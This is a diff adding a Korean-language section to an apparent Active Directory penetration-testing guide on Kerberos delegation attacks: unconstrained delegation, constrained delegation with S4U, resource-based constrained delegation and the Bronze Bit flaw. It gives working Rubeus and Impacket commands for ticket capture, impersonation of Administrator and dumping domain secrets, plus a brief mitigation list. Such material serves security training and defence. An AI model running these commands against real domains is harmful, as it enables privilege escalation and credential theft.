@@ -869,6 +869,94 @@ if __name__ == "__main__":
 
 ---
 
+## 6.5 Kerberos 위임(Delegation) 공격
+
+Kerberos 위임은 프런트엔드 서비스(예: IIS 웹서버)가 사용자를 대신해 백엔드 서비스(예: DB, 파일 공유)에 인증하도록 허용하는 기능이다. 편의를 위한 기능이지만, 위임 설정을 오용하면 도메인 관리자 권한까지 상승할 수 있는 강력한 공격 경로가 된다. 위임에는 세 가지 유형이 있다.
+
+### 6.5.1 위임 유형 비교
+
+| 유형 | 저장 속성 | 핵심 위험 | 관리자 상승 |
+|------|-----------|-----------|-------------|
+| Unconstrained(무제한) | `TrustedForDelegation` UAC 플래그 | 서비스가 인증한 사용자의 **TGT를 메모리에 저장** → 아무 서비스로나 가장 가능 | DC가 인증하도록 강제(Printer Bug)해 DC의 TGT 탈취 |
+| Constrained(제한) | `msDS-AllowedToDelegateTo` | 지정 SPN으로만 위임하나, **TGS의 SPN이 평문**이라 다른 서비스로 치환 가능 | Protocol Transition + S4U로 임의 사용자 가장 |
+| Resource-Based(RBCD) | 대상 객체의 `msDS-AllowedToActOnBehalfOfOtherIdentity` | **대상 객체 쓰기 권한**만 있으면 공격자가 위임 관계를 직접 생성 | 컴퓨터 계정 생성 후 RBCD 설정 → 임의 사용자 가장 |
+
+### 6.5.2 위임 계정 탐색 (Enumeration)
+
+```powershell
+# 무제한 위임이 설정된 컴퓨터 (DC는 정상적으로 여기 포함됨 - 제외하고 봐야 함)
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description
+
+# 제한 위임(Constrained)이 설정된 계정과 위임 허용 대상 SPN
+Get-DomainComputer -TrustedToAuth -Properties cn,msds-allowedtodelegateto   # PowerView
+
+# BloodHound에서는 노드 속성 unconstraineddelegation / allowedtodelegate 로 확인
+```
+
+### 6.5.3 무제한 위임(Unconstrained) 악용
+
+무제한 위임이 설정된 서버를 장악하면, 그 서버로 인증하는 모든 사용자의 TGT를 가로챌 수 있다. Rubeus로 인증을 모니터링한다.
+
+```cmd
+:: 장악한 무제한 위임 서버에서 5초 간격으로 들어오는 TGT 캡처
+Rubeus.exe monitor /interval:5
+
+:: 캡처한 base64 TGT를 현재 세션에 주입하여 pass-the-ticket
+Rubeus.exe ptt /ticket:<base64_TGT>
+```
+
+DC 컴퓨터 계정이 인증하도록 강제하면(예: MS-RPRN Printer Bug의 `SpoolSample`) DC의 TGT를 얻어 DCSync까지 이어진다.
+
+### 6.5.4 제한 위임 + 프로토콜 전이(S4U) 악용
+
+제한 위임 계정의 NTLM 해시를 확보하면, S4U2Self로 임의 사용자(Administrator)의 포워더블 TGS를 발급받고 S4U2Proxy로 백엔드 서비스 티켓을 얻는다. TGS의 SPN이 평문이므로 `altservice`로 다른 서비스(cifs→http 등)로 치환할 수 있다.
+
+```cmd
+:: SQL-2 서비스 계정으로 Administrator를 가장해 cifs/dc-2 티켓 획득 후 주입
+Rubeus.exe s4u /user:SQL-2$ /rc4:<NTLM해시> /impersonateuser:Administrator ^
+  /msdsspn:cifs/dc-2 /altservice:http /ptt
+```
+
+- `impersonateuser`: 가장할 사용자 (KDC는 S4U2Self의 사용자명을 신뢰함)
+- `user` / `rc4`: 제한 위임이 설정된 서비스 계정과 그 NTLM 해시
+- `msdsspn`: 해당 계정이 위임 허용된 SPN
+- `altservice`: 평문 SPN 치환으로 추가로 얻을 서비스
+
+### 6.5.5 리소스 기반 제한 위임(RBCD) 악용
+
+대상 컴퓨터 객체의 `msDS-AllowedToActOnBehalfOfOtherIdentity`에 쓰기 권한(GenericWrite/GenericAll 등)이 있으면, 공격자가 통제하는 SPN 보유 계정을 신뢰하도록 설정해 임의 사용자를 가장할 수 있다. 기본 도메인에서는 일반 사용자도 컴퓨터 계정을 최대 10개까지 생성할 수 있어(`ms-DS-MachineAccountQuota`), SPN 보유 주체를 손쉽게 확보한다.
+
+```bash
+# 1. 통제 가능한 더미 컴퓨터 계정 생성 (SPN 자동 보유)
+impacket-addcomputer -computer-name 'RBCD$' -computer-pass 'Passw0rd!' \
+  -dc-ip 10.0.2.7 'hadess.local/user:password'
+
+# 2. 대상 컴퓨터의 RBCD 속성에 더미 계정을 신뢰 주체로 기록
+impacket-rbcd -delegate-from 'RBCD$' -delegate-to 'TARGET$' -dc-ip 10.0.2.7 \
+  -action write 'hadess.local/user:password'
+
+# 3. 더미 계정으로 domain admin을 가장한 서비스 티켓 발급
+impacket-getST -spn 'cifs/target.hadess.local' -impersonate 'Administrator' \
+  -dc-ip 10.0.2.7 'hadess.local/RBCD$:Passw0rd!'
+
+# 4. 티켓 캐시 지정 후 대상 시스템 장악
+export KRB5CCNAME=Administrator.ccache
+impacket-secretsdump -k -no-pass target.hadess.local
+```
+
+### 6.5.6 Bronze Bit (CVE-2020-17049)
+
+Bronze Bit은 KDC가 S4U2Proxy 요청 시 TGS의 `forwardable` 플래그 검증을 우회하도록 만드는 취약점이다. 서비스 계정 해시를 가진 공격자가 **위임 불가로 표시된 사용자(예: Protected Users 그룹)나 forwardable이 아닌 티켓까지 가장**할 수 있게 해 제한 위임의 방어를 무력화한다. Impacket의 `getST`에서 `-force-forwardable` 옵션으로 악용한다.
+
+```bash
+impacket-getST -spn 'cifs/target' -impersonate 'Administrator' \
+  -force-forwardable 'domain/service1$:hash' -dc-ip 10.0.2.7
+```
+
+> 방어: 무제한 위임을 폐기하고 RBCD로 전환, 민감 계정에 "위임할 수 없음(Account is sensitive and cannot be delegated)" 표시 + Protected Users 그룹 사용, DC 및 모든 시스템에 CVE-2020-17049 패치 적용, `ms-DS-MachineAccountQuota`를 0으로 설정해 임의 컴퓨터 계정 생성 차단.
+
+---
+
 ## 7. 실전 시나리오: AD 완전 장악 5단계
 
 실제 침투 테스터와 APT 그룹이 사용하는 일반적인 AD 장악 경로다.
